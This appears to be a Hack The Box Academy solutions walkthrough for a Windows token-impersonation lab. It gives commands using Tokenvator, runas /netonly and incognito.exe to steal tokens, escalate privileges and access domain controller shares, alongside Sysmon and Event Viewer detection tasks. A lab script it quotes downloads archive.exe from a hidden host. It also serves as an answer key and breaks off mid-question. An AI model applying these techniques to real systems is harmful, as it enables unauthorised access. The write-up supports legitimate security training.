Subsequently, students will use the `help` command to find the command responsible for elevating to `NT AUTHORITY\SYSTEM`, additionally, students can use the wiki of the tool on [GitHub](https://github.com/0xbadjuju/Tokenvator/wiki):

Code: cmd

```cmd
help
```

```
(Tokens) > help

Name                     Optional            Required
----                     --------            --------
Info                     all                 -
Help                     Command             -
History                  -                   -

Add_Privilege            Process             Privilege

<SNIP>

Nuke_Privileges          Process             -

{hidden}                 Command             -
GetTrustedInstaller      Command             -
Steal_Token              Command             Process

<SNIP>
```

Answer: `GetSystem`

# Token Impersonation

## Question 1

### "In a command prompt, execute "C:\\Tools\\impersonate-lab.exe" and follow the instruction to find the answer. If you need to check event logs of Domain Controller, you can use credentials as "LEGACY\\logman:logger@123" in Event Viewer. The answer format is \*\*\*\*\*\*\*\*\*n"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-uoynqlpxe1]─[~]
└──╼ [★]$ xfreerdp /v:10.129.64.107 /u:normal.user /p:'password@123' /dynamic-resolution

[07:22:39:044] [118004:118005] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[07:22:39:044] [118004:118005] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[07:22:39:044] [118004:118005] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:22:39:044] [118004:118005] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:22:39:044] [118004:118005] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:22:39:044] [118004:118005] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.64.107:3389) 
[07:22:39:044] [118004:118005] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:22:39:044] [118004:118005] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:22:39:044] [118004:118005] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[07:22:39:044] [118004:118005] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.64.107:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open Command Prompt as Administrator, navigate to `C:\Tools`, and execute the `impersonate-lab.exe` executable:

Code: cmd

```cmd
cd C:\Tools
.\impersonate-lab.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Tools

C:\Tools>.\impersonate-lab.exe

[+] Successfully impersonated a user.
[+] Hidden File from admin share is opened successfully: \\dc01\admin-Shares\answer.txt
[+] Reading File contents...
     -> The answer is username that is used to access this hidden admin file. Event logs on \\DC01 are your friends.
[+] Reverted to self.
```

Next, students will open `Event Viewer`, `Action` -> `Connect to Another Computer`:

![[HTB Solutions/Others/z. images/f5d4bd1101593ee7640951a3a76facc9_MD5.webp]]

In the new window, students will submit the value for the `Another Computer` as `DC01` and will leave a checkmark on the `Connect as another user: <none>` -> `Set User ...`:

![[HTB Solutions/Others/z. images/32f9e0841aafd830acacb746f4167f0e_MD5.webp]]

Then, they will submit the credentials `LEGACY\logman:logger@123` and then click twice `OK`:

![[HTB Solutions/Others/z. images/c74cc8f56f50d366e7136c1b7a3d3762_MD5.webp]]

Students will go to `Windows Logs` -> `Security`, and will set a filter using `Filter Current Log...` for an event ID 4624 (an account was successfully logged in):

![[HTB Solutions/Others/z. images/eaed066a65d1f504c6886f1e1a3e919b_MD5.webp]]

Students will carefully analyze the logs to find a log related to a new logon and its account name:

![[HTB Solutions/Others/z. images/3cb8aebff7ed68984b8de99ee578e234_MD5.webp]]

Answer: `superadmin`

# Token Impersonation

## Question 2

### "Run the "C:\\Tools\\impersonate.exe" program. Enter the details (Username: admin, Domain: WIN-TOKEN, Password: admin@123) and check the threads and its details in Token Viewer by running "Show-NtToken -All". Type the Integrity Level as your answer."

Students will return to the previously spawned Command Prompt, and will run the `impersonate.exe` executable, and submit information related to the username, domain, and password (admin; WIN-TOKEN; admin@123):

Code: cmd

```cmd
.\impersonate.exe
admin
WIN-TOKEN
admin@123
```

```
C:\Tools>.\impersonate.exe

Enter username: admin
Enter domain: WIN-TOKEN
Enter password: admin@123

[+] LogonUser success!
[+] DuplicateToken success!

----Before Impersonation----
Current Username : normal.user

[+] ImpersonateLoggedOnUser success!

----After Impersonation----
Current Username: admin
```

Next, students will open PowerShell and run the `Show-NtToken -All` cmdlet:

Code: powershell

```powershell
Show-NtToken -All
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\normal.user> Show-NtToken -All
```

Within `Token Viewer` students will use the `Text Filter` to filter for `impersonate.exe` and find the `Integrity Level`:

![[HTB Solutions/Others/z. images/a815f2b9750aec8147c87d7c089ba206_MD5.webp]]

Answer: `High`

# Make Access Tokens

## Question 1

### "Use RunAs.exe as "WIN-TOKEN\\admin" with password "admin@123". Access the file "C:\\Users\\admin\\Desktop\\admin-notes.txt". Type the file contents as your answer."

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-bcqg1wtehn]─[~]
└──╼ [★]$ xfreerdp /v:10.129.233.54 /u:normal.user /p:'password@123' /dynamic-resolution

[00:13:03:689] [83503:83504] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[00:13:03:689] [83503:83504] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[00:13:03:689] [83503:83504] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[00:13:03:736] [83503:83504] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:13:03:736] [83503:83504] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[00:13:03:737] [83503:83504] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:13:03:737] [83503:83504] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:13:03:737] [83503:83504] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:13:03:737] [83503:83504] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.233.54:3389) 
[00:13:03:737] [83503:83504] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:13:03:737] [83503:83504] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:13:03:737] [83503:83504] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[00:13:03:737] [83503:83504] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.233.54:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open Command Prompt and use the native `RunAs` binary to spawn another Command Prompt using the `WIN-TOKEN\admin:admin@123` credentials:

Code: cmd

```cmd
"C:\Windows\System32\runas.exe" /user:WIN-TOKEN\admin cmd.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\normal.user>"C:\Windows\System32\runas.exe" /user:WIN-TOKEN\admin cmd.exe

Enter the password for WIN-TOKEN\admin: admin@123
Attempting to start cmd.exe as user "WIN-TOKEN\admin" ...
```

Subsequently, students will use the newly spawned Command Prompt to attain the flag (`admin-notes.txt`) located in the `C:\Users\admin\Desktop` directory:

Code: cmd

```cmd
type C:\Users\admin\Desktop\admin-notes.txt
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\admin\Desktop\admin-notes.txt

{hidden}
```

Answer: `Admin-Sup3rS3cr3t`

# Network Authentication

## Question 1

### "Use Runas.exe with the NETONLY flag, and login with the admin.user account to run powershell.exe. List the directories in \\\\dc01\\C$. Type the name of folder that ends with $. Answer format is \*\*\*\*\*S$"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-bcqg1wtehn]─[~]
└──╼ [★]$ xfreerdp /v:10.129.144.68 /u:normal.user /p:'password@123' /dynamic-resolution

[00:29:58:561] [110058:110059] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:29:58:561] [110058:110059] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[00:29:58:561] [110058:110059] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:29:58:561] [110058:110059] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:29:58:561] [110058:110059] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:29:58:561] [110058:110059] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.144.68:3389) 
[00:29:58:561] [110058:110059] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:29:58:561] [110058:110059] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:29:58:561] [110058:110059] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[00:29:58:561] [110058:110059] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.144.68:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open Command Prompt and will use the native `RunAs` binary to spawn PowerShell prompt using the credentials `legacy\admin:password@123` (from the section material):

Code: cmd

```cmd
runas /netonly /user:legacy\admin.user powershell.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\normal.user>runas /netonly /user:legacy\admin.user powershell.exe

Enter the password for legacy\admin.user: password@123
Attempting to start powershell.exe as user "legacy\admin.user" ...
```

Subsequently, students will query the contents of the `\\dc01\c$` directory finding the directory ending with `$` within the newly spawned PowerShell window:

Code: powershell

```powershell
dir \\dc01\c$
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> dir \\dc01\c$

    Directory: \\dc01\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/16/2024   7:17 AM                admin-shares
d-----        1/21/2025  12:19 PM                {hidden}
d-----       12/17/2024   5:29 AM                Hospital

<SNIP>
```

Answer: `ADMINS$`

# Detections Opportunities

## Question 1

### "Open etw and sysmon logs from "C:\\Tools\\logs" in Event Viewer. There is a spoofed parent with PID 508. Analyze both sysmon and etw event logs to find the process name for PID 508, and type it as your answer. Answer format is \*\*\*\*\*\*\*\*.exe"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-bcqg1wtehn]─[~]
└──╼ [★]$ xfreerdp /v:10.129.31.5 /u:normal.user /p:'password@123' /dynamic-resolution

[00:57:37:683] [153502:153503] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:57:37:683] [153502:153503] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[00:57:37:684] [153502:153503] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:57:37:684] [153502:153503] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:57:37:684] [153502:153503] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:57:37:684] [153502:153503] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.31.5:3389) 
[00:57:37:684] [153502:153503] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:57:37:684] [153502:153503] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:57:37:684] [153502:153503] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[00:57:37:684] [153502:153503] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.31.5:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open `Event Viewer` and load the `etw.etvx` and `sysmon.evtx` log files located in the `C:\Tools\logs` directory, `Action` -> `Open Saved Log`:

![[HTB Solutions/Others/z. images/ecf6d5e0e1218cdd58e1de3cb83f3cd1_MD5.webp]]

![[HTB Solutions/Others/z. images/feb021bc838e924feadfc60ba900081b_MD5.webp]]

![[HTB Solutions/Others/z. images/fa8eb75a392e2790f821d98ac6a4984d_MD5.jpg]]

Next, students will use a filter (`Filter Current Log...`) for event IDs related to process creation ([event ID 1](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90001)):

![[HTB Solutions/Others/z. images/3611e52784ec4aa3fd5835cf4107966d_MD5.jpg]]

Upon scrutinizing the logs, students will notice and take note of a process creation (`process 4264 started...`) related to the parent process (`508`) in the `etw.evtx` logs:

![[HTB Solutions/Others/z. images/98adccb699e111f422f7e084b603c6c4_MD5.webp]]

Next, students will move to the `sysmon.evtx` logs and set a filter for process creation related to event ID `1` using the `Filter Current Log...` functionality:

![[HTB Solutions/Others/z. images/6c065204044b5022b16ff54b98b250f4_MD5.jpg]]

Students will use the `Find` functionality to look for event logs having process ID of `4264`:

![[HTB Solutions/Others/z. images/9e480e1afeee9bb14b9a33266537b313_MD5.jpg]]

Upon analyzing the logs, students will come across a log having `ParentProcessId` of `508` and will find the `ParentImage` process that created the main process:

![[HTB Solutions/Others/z. images/dddf350e59fc05a786c8a692d75961fe_MD5.jpg]]

Answer: `explorer.exe`

# Detections Opportunities

## Question 2

### "For the same event, what is the original parent process ID?"

Students will clear the previously set filter and will set a new filter to scrutinize logs related to `Process accessed` (event ID 10):

![[HTB Solutions/Others/z. images/29cc1b14337084fa18d0bfbab29fd516_MD5.jpg]]

Next, students will use the `Find` functionality to look for events with process ID `4264`, stumbling upon the `SourceProcessId` to identify the process ID that opened another process (the parent process):

![[HTB Solutions/Others/z. images/5d64cddc5bcc5410b7ccca20b25c4cec_MD5.jpg]]

Answer: `3140`

# Detections Opportunities

## Question 3

### "What is the process name of the original parent of the process having PID 4264? Answer format is \*\*\*\*\*\*\*\*\*\*r.exe"

Within the same log, students will find the name of the executable (parent process) within `SourceImage`:

![[HTB Solutions/Others/z. images/5d64cddc5bcc5410b7ccca20b25c4cec_MD5.jpg]]

Answer: `TokenPlayer.exe`

# Skills Assessment

## Question 1

### "On the target (VM), which account was used for impersonation? Answer format is L\*\*\*\*\*\\\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `normal.user:password@123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:normal.user /p:'password@123' /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.95]─[htb-ac-8414@htb-gzfouqiecn]─[~]
└──╼ [★]$ xfreerdp /v:10.129.233.54 /u:normal.user /p:'password@123' /dynamic-resolution

[05:01:49:683] [6850:6851] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[05:01:49:683] [6850:6851] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[05:01:49:683] [6850:6851] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[05:01:49:735] [6850:6851] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:01:49:735] [6850:6851] [WARN][com.freerdp.crypto] - CN = WIN-TOKEN.LEGACY.CORP
[05:01:49:736] [6850:6851] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:01:49:736] [6850:6851] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[05:01:49:736] [6850:6851] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[05:01:49:736] [6850:6851] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.233.54:3389) 
[05:01:49:736] [6850:6851] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[05:01:49:736] [6850:6851] [ERROR][com.freerdp.crypto] - Common Name (CN):
[05:01:49:736] [6850:6851] [ERROR][com.freerdp.crypto] - 	WIN-TOKEN.LEGACY.CORP
[05:01:49:736] [6850:6851] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.233.54:3389 (RDP-Server):
	Common Name: WIN-TOKEN.LEGACY.CORP
	Subject:     CN = WIN-TOKEN.LEGACY.CORP
	Issuer:      CN = WIN-TOKEN.LEGACY.CORP
	Thumbprint:  4c:a4:91:df:e7:e8:d8:b5:d0:5b:dc:a4:80:1d:a0:3c:31:0a:3f:6a:90:88:fa:1d:d4:76:5b:fd:9a:d4:18:c4
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open `x64dbg.exe` located on the Desktop as an Administrator and will open the`token-assessment.exe` binary located in the `C:\Tools` directory using `File` -> `Open`:

![[HTB Solutions/Others/z. images/70e68e3007810d588d8d56d1a5ca6518_MD5.jpg]]

![[HTB Solutions/Others/z. images/dfb574180ff4cb23345d588051ad03b7_MD5.jpg]]

Next, students will navigate to the `Symbols` tab, select the `token-assessment.exe` module, and set a breakpoint on the `advapi32.LogoUserW` by right-clicking and choosing `Toggle Breakpoint`:

![[HTB Solutions/Others/z. images/d289ce85306497057f34fc26b2c9a821_MD5.jpg]]

Students will run the program until the breakpoint is reached to uncover the domain account used for impersonation within the `RCX` and `RDX` registers (values within temporary registers):

![[HTB Solutions/Others/z. images/39d9ad2badded6dd0c4b67b64ea53b60_MD5.jpg]]

Answer: `LEGACY\john`

# Skills Assessment

## Question 2

### "In the Sysmon logs, look for any file creation events in the directory C:\\Tools\\temp\\. What is the file name? Answer format is ***\-***\*\*\*.ps1"

Students will stop `x64dbg.exe`, and will open `Event Viewer`, navigate to the `Operational` logs of Sysmon located at `Applications and Services Logs` -> `Microsoft` -> `Windows` -> `Sysmon`:

![[HTB Solutions/Others/z. images/7ebbac0644ee0395e4830263f9efb3a6_MD5.jpg]]

Next, students will set a filter related to file create operations (event ID `11`) using the `Filter Current Log...` functionality:

![[HTB Solutions/Others/z. images/f0f6a22434c756050c693f037446d0db_MD5.jpg]]

They will open a Command Prompt as Administrator, navigate to the `C:\Tools` directory, and execute the `token-assessment.exe` binary:

Code: cmd

```cmd
cd C:\Tools
.\token-assessment.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Tools

C:\Tools>.\token-assessment.exe

[+] Token impersonation success!
[+] Successfully did something on a remote network share under impersonated user. Find out in logs on local and remote server.
[+] Successfully created NT AUTHORITY\SYSTEM shell. PID: 3452
[?] Run incognito.exe within system shell and look for interesting Delegate tokens..

   -> Press ENTER key to exit...
```

Students will return to `Event Viewer` and refresh the logs to find and analyze a log related to the `token-assessment.exe` binary and the `TargetFilename` of the created file in the `C:\Tools\temp\` directory:

![[HTB Solutions/Others/z. images/d81f90e5402c6f9b42ef1a9e24c77a2e_MD5.jpg]]

Answer: `win-update.ps1`

# Skills Assessment

## Question 3

### "Analyze the security event logs on DC01 to look for any evidence related to the PowerShell script file found in the previous question. What is the domain name mentioned in the script? Answer format is ***\-*****\-**\*.local"

Students will open PowerShell as Administrator and will query the contents, including hidden files of the directory found (`C:\Tools\temp`) in the log from the previous question, confirming the absence of the `.ps1` file:

Code: powershell

```powershell
dir C:\Tools\temp -Hidden
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> dir C:\Tools\temp -Hidden
```

Next, students will return to `Event Viewer`, scroll to the top, and right-click on `Event Viewer (Local)` and `Connect to Another Computer...`:

![[HTB Solutions/Others/z. images/c9a450adb0536ce0fe145a64eabf8e94_MD5.jpg]]

Students will scrutinize the logs on the `DC01` computer using the credentials `LEGACY\logman:logger@123` by specifying `DC01` in the `Another Computer` field, setting a checkmark on `Connect as another user: <none>` and then on `Set User ...` to supply the credentials:

![[HTB Solutions/Others/z. images/2cf9a73038bee971eb5a322d33e0be86_MD5.jpg]]

Subsequently, students will again navigate to the `Operational` logs of Sysmon and use the `Find` functionality to search for events having the string `win-update.ps1` to uncover the location of the file:

![[HTB Solutions/Others/z. images/66d88649a3493114ac5bc88966d99afd_MD5.jpg]]

With the obtained information, students will return to the PowerShell prompt, and query the contents of the `\\dc01\Public-Shares\Logs` directory while looking for hidden files:

Code: powershell

```powershell
dir \\dc01\Public-Shares\Logs -Hidden
```

```
PS C:\Windows\system32> dir \\dc01\Public-Shares\Logs -Hidden

    Directory: \\dc01\Public-Shares\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-h--        1/31/2025   6:24 AM             97 win-update.ps1
```

Having confirmed the presence of the `win-update.ps1` file, students will proceed to query the contents to obtain information related to the domain name in the PowerShell script:

Code: powershell

```powershell
Get-Content \\dc01\Public-Shares\Logs\win-update.ps1
```

```
PS C:\Windows\system32> Get-Content \\dc01\Public-Shares\Logs\win-update.ps1

Invoke-WebRequest https://{hidden}/archive.exe -OutFile 'C:\\Tools\\Temp\\archive.exe'
```

Answer: `htb-token-lab.local`

# Skills Assessment

## Question 4

### "Type the username that was used to create this PowerShell script on DC01. You may go through the Sysmon logs on DC01. Answer format is : NT\*\*\*\*\*\*\*\*\*\*\\\*\*\*\*\*\*"

Students will scrutinize the log found in the previous question related to `File created` (event ID `11`), finding the user responsible for the creation of the file:

![[HTB Solutions/Others/z. images/66d88649a3493114ac5bc88966d99afd_MD5.jpg]]

Answer: `NT AUTHORITY\SYSTEM`

# Skills Assessment

## Question 5

### "Type the content of the C:\\skills-assessment\\flag\\flag-final.txt file as your answer. Answer format is ctf-{*****\-******}-*\*\*"

Students will return to the PowerShell prompt, navigate to `C:\Tools`, and use `incognito.exe` to list the available tokens and find a token related to another user:

Code: powershell

```powershell
cd C:\Tools
.\incognito.exe list_tokens -u
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Tools
PS C:\Tools> .\incognito.exe list_tokens -u

[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Listing unique users found

Delegation Tokens Available
============================================
LEGACY\normal.user
LEGACY\sysadmin

<SNIP>
```

Next, students will use `incognito.exe` to spawn a Command Prompt in the context of the `LEGACY\sysadmin` user and his token:

Code: powershell

```powershell
.\incognito.exe execute -c "LEGACY\sysadmin" C:\Windows\System32\cmd.exe
```

```
PS C:\Tools> .\incognito.exe execute -c "LEGACY\sysadmin" C:\Windows\System32\cmd.exe

[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
[*] Enumerating tokens
[*] Searching for availability of requested token
[+] Requested token found
[+] Delegation token available
[*] Attempting to create new child process and communicate via anonymous pipe

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Tools>
```

Lastly, students will query the `flag-final.txt` file located in the `C:\skills-assessment\flag\` directory:

Code: cmd

```cmd
type \\dc01\c$\skills-assessment\flag\flag-final.txt
```

```
C:\Tools>type \\dc01\c$\skills-assessment\flag\flag-final.txt

{hidden}
```

Answer: `ctf-{Token-Player}-htb`

# Skills Assessment

## Question 6

### "Which security group you added the user to be able to access the path '\\\\dc01\\c$\\ADMINS$' ? Answer format is LEGACY\\A\*\*\*\*-\*\*\*\*\*"

Students will run PowerShell as the `admin.user` user and password `password@123` by right-clicking on `PowerShell` -> `More` -> `Run as different user`:

![[HTB Solutions/Others/z. images/5b878fafec7bae6d5431c77be89bb056_MD5.jpg]]

![[HTB Solutions/Others/z. images/9667c0a7c6fb545aee93413c81688294_MD5.jpg]]

Students will establish a PowerShell session using `Enter-PSSession` on `DC01` and use the `Get-ACL` cmdlet to display the access control list (permissions) of the `ADMINS$` directory on `\\dc01\`:

Code: powershell

```powershell
Enter-PSSession -ComputerName DC01
Get-ACL -Path "\\dc01\C$\ADMINS$\" | Format-List -Property AccessToString
```

```
PS C:\Users\normal.user> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\admin.user\Documents> Get-ACL -Path "\\dc01\C$\ADMINS$\" | Format-List -Property AccessToString

AccessToString : NT AUTHORITY\SYSTEM Allow  FullControl
                 BUILTIN\Administrators Allow  FullControl
                 LEGACY\Administrator Allow  FullControl
                 {hidden}            Allow  ReadAndExecute, Synchronize
```

Answer: `LEGACY\Admin-Files`

# Skills Assessment

## Question 7

### "Type the name of the powershell script present under path '\\dc01\\c$\\ADMINS$'"

Students will use the PowerShell session on DC01 to add the `admin.user` to the `Admin-Files` group:

Code: powershell

```powershell
net group Admin-Files admin.user /add
```

```
[DC01]: PS C:\Users\admin.user\Documents> net group Admin-Files admin.user /add

The command completed successfully.
```

Subsequently, students will change their current working directory to `C:\ADMINS$` and list the contents of the directory to find the PowerShell script (`.ps1`) file:

```powershell
cd 'C:\ADMINS$'
ls
```
```
[DC01]: PS C:\Users\admin.user\Documents> cd 'C:\ADMINS$\'
[DC01]: PS C:\ADMINS$> ls

    Directory: C:\ADMINS$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/21/2025  12:20 PM                Backup
d-----        1/21/2025  12:20 PM                PerfLogs
d-----        1/21/2025  12:20 PM                Program Data
d-----        1/21/2025  12:20 PM                Program Files
d-----        1/21/2025  12:20 PM                Program Files (x86)
d-----        1/21/2025  12:20 PM                Windows
d-----        1/21/2025  12:20 PM                Windows.old
-a----        1/21/2025  12:16 PM             12 creds.txt
-a----        1/21/2025  12:16 PM             12 notes.txt
-a----        1/21/2025  12:16 PM            337 {hidden}
-a----        1/21/2025  12:16 PM             12 transcript.txt
```

Answer: `remote.ps1`

# Skills Assessment

## Question 8

### "Type the domain name mentioned in the powershell file present under the path '\\dc01\\c$\\ADMINS$'. Answer format is *****\-\*\*\*\*\*\*\*\*\*\*.htb.*****"

Students will exit the PowerShell session and reestablish the connection using `runas` to reflect on the update within the group memberships of the user:

```powershell
exit
runas /netonly /user:legacy\admin.user cmd.exe
```
```
[DC01]: PS C:\Users\admin.user\Documents> exit
PS C:\Users\normal.user> runas /netonly /user:legacy\admin.user cmd.exe

Enter the password for legacy\admin.user: password@123
